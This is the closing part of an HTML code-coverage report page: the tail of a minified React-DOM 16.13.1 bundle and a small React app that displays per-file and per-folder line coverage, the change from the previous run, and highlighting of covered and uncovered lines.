b,d,!0,a,c);case 19:return vh(a,b,c)}throw Error(k(156,b.tag));};var bf=null,Ne=null,la=function(a,b,c,d){return new Fj(a,b,c,d)};ef.prototype.render=function(a){md(a,this._internalRoot,null,null)};ef.prototype.unmount=function(){var a=this._internalRoot,b=a.containerInfo;md(null,a,null,function(){b[Lb]=null})};var Di=function(a){if(13===a.tag){var b=Fc(ka(),150,100);Ja(a,b);df(a,b)}};var Yf=function(a){13===a.tag&&(Ja(a,3),df(a,3))};var Bi=function(a){if(13===a.tag){var b=ka();b=Va(b,a,null);Ja(a,
b);df(a,b)}};sd=function(a,b,c){switch(b){case "input":Dd(a,c);b=c.name;if("radio"===c.type&&null!=b){for(c=a;c.parentNode;)c=c.parentNode;c=c.querySelectorAll("input[name="+JSON.stringify(""+b)+'][type="radio"]');for(b=0;b<c.length;b++){var d=c[b];if(d!==a&&d.form===a.form){var e=ae(d);if(!e)throw Error(k(90));Gf(d);Dd(d,e)}}}break;case "textarea":Lf(a,c);break;case "select":b=c.value,null!=b&&hb(a,!!c.multiple,b,!1)}};(function(a,b,c,d){ee=a;eg=b;vd=c;vf=d})(Qh,function(a,b,c,d,e){var f=p;p|=4;
try{return Da(98,a.bind(null,b,c,d,e))}finally{p=f,p===H&&ha()}},function(){(p&(1|ca|ma))===H&&(uj(),xb())},function(a,b){var c=p;p|=2;try{return a(b)}finally{p=c,p===H&&ha()}});var mk={Events:[Hb,Pa,ae,pf,qd,lb,function(a){Kd(a,Ki)},sf,tf,sc,pc,xb,{current:!1}]};(function(a){var b=a.findFiberByHostInstance;return Ej(M({},a,{overrideHookState:null,overrideProps:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:da.ReactCurrentDispatcher,findHostInstanceByFiber:function(a){a=Sf(a);
return null===a?null:a.stateNode},findFiberByHostInstance:function(a){return b?b(a):null},findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null}))})({findFiberByHostInstance:Bb,bundleType:0,version:"16.13.1",rendererPackageName:"react-dom"});I.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=mk;I.createPortal=Xh;I.findDOMNode=function(a){if(null==a)return null;if(1===a.nodeType)return a;var b=a._reactInternalFiber;if(void 0===
b){if("function"===typeof a.render)throw Error(k(188));throw Error(k(268,Object.keys(a)));}a=Sf(b);a=null===a?null:a.stateNode;return a};I.flushSync=function(a,b){if((p&(ca|ma))!==H)throw Error(k(187));var c=p;p|=1;try{return Da(99,a.bind(null,b))}finally{p=c,ha()}};I.hydrate=function(a,b,c){if(!bc(b))throw Error(k(200));return nd(null,a,b,!0,c)};I.render=function(a,b,c){if(!bc(b))throw Error(k(200));return nd(null,a,b,!1,c)};I.unmountComponentAtNode=function(a){if(!bc(a))throw Error(k(40));return a._reactRootContainer?
(Rh(function(){nd(null,null,a,!1,function(){a._reactRootContainer=null;a[Lb]=null})}),!0):!1};I.unstable_batchedUpdates=Qh;I.unstable_createPortal=function(a,b){return Xh(a,b,2<arguments.length&&void 0!==arguments[2]?arguments[2]:null)};I.unstable_renderSubtreeIntoContainer=function(a,b,c,d){if(!bc(c))throw Error(k(200));if(null==a||void 0===a._reactInternalFiber)throw Error(k(38));return nd(a,b,c,!1,d)};I.version="16.13.1"});
</script>
    <script>const e = React.createElement;

function pathToString(path) {
  if (path[0] === '/') {
    return '/' + path.slice(1).join('/');
  } else {
    return path.join('/');
  }
}

function findCommonPath(files) {
  if (!files || !files.length) {
    return [];
  }

  function isPrefix(arr, prefix) {
    if (arr.length < prefix.length) {
      return false;
    }
    for (let i = prefix.length - 1; i >= 0; --i) {
      if (arr[i] !== prefix[i]) {
        return false;
      }
    }
    return true;
  }

  let commonPath = files[0].path.slice(0, -1);
  while (commonPath.length) {
    if (files.every(file => isPrefix(file.path, commonPath))) {
      break;
    }
    commonPath.pop();
  }
  return commonPath;
}

function findFolders(files) {
  if (!files || !files.length) {
    return [];
  }

  let folders = files.filter(file => file.path.length > 1).map(file => file.path[0]);
  folders = [...new Set(folders)]; // unique
  folders.sort();

  folders = folders.map(folder => {
    let filesInFolder = files
      .filter(file => file.path[0] === folder)
      .map(file => ({
        ...file,
        path: file.path.slice(1),
        parent: [...file.parent, file.path[0]],
      }));

    const children = findFolders(filesInFolder); // recursion

    return {
      is_folder: true,
      path: [folder],
      parent: files[0].parent,
      children,
      covered: children.reduce((sum, file) => sum + file.covered, 0),
      coverable: children.reduce((sum, file) => sum + file.coverable, 0),
      prevRun: {
        covered: children.reduce((sum, file) => sum + file.prevRun.covered, 0),
        coverable: children.reduce((sum, file) => sum + file.prevRun.coverable, 0),
      }
    };
  });

  return [
    ...folders,
    ...files.filter(file => file.path.length === 1),
  ];
}

class App extends React.Component {
  constructor(...args) {
    super(...args);

    this.state = {
      current: [],
    };
  }

  componentDidMount() {
    this.updateStateFromLocation();
    window.addEventListener("hashchange", () => this.updateStateFromLocation(), false);
  }

  updateStateFromLocation() {
    if (window.location.hash.length > 1) {
      const current = window.location.hash.substr(1).split('/');
      this.setState({current});
    } else {
      this.setState({current: []});
    }
  }

  getCurrentPath() {
    let file = this.props.root;
    let path = [file];
    for (let p of this.state.current) {
      file = file.children.find(file => file.path[0] === p);
      if (!file) {
        return path;
      }
      path.push(file);
    }
    return path;
  }

  render() {
    const path = this.getCurrentPath();
    const file = path[path.length - 1];

    let w = null;
    if (file.is_folder) {
      w = e(FilesList, {
        folder: file,
        onSelectFile: this.selectFile.bind(this),
        onBack: path.length > 1 ? this.back.bind(this) : null,
      });
    } else {
      w = e(DisplayFile, {
        file,
        onBack: this.back.bind(this),
      });
    }

    return e('div', {className: 'app'}, w);
  }

  selectFile(file) {
    this.setState(({current}) => {
      return {current: [...current, file.path[0]]};
    }, () => this.updateHash());
  }

  back(file) {
    this.setState(({current}) => {
      return {current: current.slice(0, current.length - 1)};
    }, () => this.updateHash());
  }

  updateHash() {
    if (!this.state.current || !this.state.current.length) {
      window.location = '#';
    } else {
      window.location = '#' + this.state.current.join('/');
    }
  }
}

function FilesList({folder, onSelectFile, onBack}) {
  let files = folder.children;
  return e('div', {className: 'display-folder'},
    e(FileHeader, {file: folder, onBack}),
    e('table', {className: 'files-list'},
      e('thead', {className: 'files-list__head'},
        e('tr', null,
          e('th', null, "Path"),
          e('th', null, "Coverage")
        )
      ),
      e('tbody', {className: 'files-list__body'},
        files.map(file => e(File, {file, onClick: onSelectFile}))
      )
    )
  );
}

function File({file, onClick}) {
  const coverage = file.coverable ? file.covered / file.coverable * 100 : -1;
  const coverageDelta = file.prevRun &&
    (file.covered / file.coverable * 100 - file.prevRun.covered / file.prevRun.coverable * 100);

  return e('tr', {
      className: 'files-list__file'
        + (coverage >= 0 && coverage < 50 ? ' files-list__file_low': '')
        + (coverage >= 50 && coverage < 80 ? ' files-list__file_medium': '')
        + (coverage >= 80 ? ' files-list__file_high': '')
        + (file.is_folder ? ' files-list__file_folder': ''),
      onClick: () => onClick(file),
    },
    e('td', null, e('a', null, pathToString(file.path))),
    e('td', null,
      file.covered + ' / ' + file.coverable +
      (coverage >= 0 ? ' (' + coverage.toFixed(2) + '%)' : ''),
      e('span', {title: 'Change from the previous run'},
        (coverageDelta ? ` (${coverageDelta > 0 ? '+' : ''}${coverageDelta.toFixed(2)}%)` : ''))
    )
  );
}

function DisplayFile({file, onBack}) {
  return e('div', {className: 'display-file'},
    e(FileHeader, {file, onBack}),
    e(FileContent, {file})
  );
}

function FileHeader({file, onBack}) {
  const coverage = file.covered / file.coverable * 100;
  const coverageDelta = file.prevRun && (coverage - file.prevRun.covered / file.prevRun.coverable * 100);

  return e('div', {className: 'file-header'},
    onBack ? e('a', {className: 'file-header__back', onClick: onBack}, 'Back') : null,
    e('div', {className: 'file-header__name'}, pathToString([...file.parent, ...file.path])),
    e('div', {className: 'file-header__stat'},
      'Covered: ' + file.covered + ' of ' + file.coverable +
      (file.coverable ? ' (' + coverage.toFixed(2) + '%)' : ''),
      e('span', {title: 'Change from the previous run'},
        (coverageDelta ? ` (${coverageDelta > 0 ? '+' : ''}${coverageDelta.toFixed(2)}%)` : ''))
    )
  );
}

function FileContent({file}) {
  return e('pre', {className: 'file-content'},
    file.content.split(/\r?\n/).map((line, index) => {
      const trace = file.traces.find(trace => trace.line === index + 1);
      const covered = trace && trace.stats.Line;
      const uncovered = trace && !trace.stats.Line;
      return e('code', {
          className: 'code-line'
            + (covered ? ' code-line_covered' : '')
            + (uncovered ? ' code-line_uncovered' : ''),
          title: trace ? JSON.stringify(trace.stats, null, 2) : null,
        }, line);
    })
  );
}

(function(){
  const commonPath = findCommonPath(data.files);
  const prevFilesMap = new Map();

  previousData && previousData.files.forEach((file) => {
    const path = file.path.slice(commonPath.length).join('/');
    prevFilesMap.set(path, file);
  });

  const files = data.files.map((file) => {
    const path = file.path.slice(commonPath.length);
    const { covered = 0, coverable = 0 } = prevFilesMap.get(path.join('/')) || {};
    return {
      ...file,
      path,
      parent: commonPath,
      prevRun: { covered, coverable },
    };
  });

  const children = findFolders(files);

  const root = {
    is_folder: true,
    children,
    path: commonPath,
    parent: [],
    covered: children.reduce((sum, file) => sum + file.covered, 0),
    coverable: children.reduce((sum, file) => sum + file.coverable, 0),
    prevRun: {
      covered: children.reduce((sum, file) => sum + file.prevRun.covered, 0),
      coverable: children.reduce((sum, file) => sum + file.prevRun.coverable, 0),
    }
  };

  ReactDOM.render(e(App, {root, prevFilesMap}), document.getElementById('root'));
}());
</script>
</body>
</html>